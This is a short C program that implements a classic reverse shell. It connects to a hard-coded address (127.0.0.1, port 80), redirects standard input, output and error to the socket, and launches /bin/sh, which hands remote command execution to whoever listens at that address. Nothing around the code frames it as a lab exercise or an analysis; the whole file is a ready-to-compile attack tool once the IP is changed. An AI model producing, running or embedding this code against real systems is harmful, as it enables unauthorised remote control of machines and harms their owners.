#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

const char* IP = "127.0.0.1";
const int PORT = 80;

int main() {
  const char* server_ip = IP;
  const int server_port = PORT;

  printf("Connecting to %s:%d\n", server_ip, server_port);

  struct sockaddr_in server_address;
  memset(&server_address, 0, sizeof(server_address));
  server_address.sin_family = AF_INET;

  // Converts an ip from presentation (string) to network (binary)
  inet_pton(AF_INET, server_ip, &server_address.sin_addr);

  server_address.sin_port = htons(server_port);

  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == -1) {
      perror("socket");
      return EXIT_FAILURE;
  }

  if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
      perror("connect");
      return EXIT_FAILURE;
  }

  // Redirect stdin, stdout, and stderr to the socket
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);

  execl("/bin/sh", "/bin/sh", NULL);

  // If execl fails, print an error message
  perror("execl");
  return EXIT_FAILURE;
}
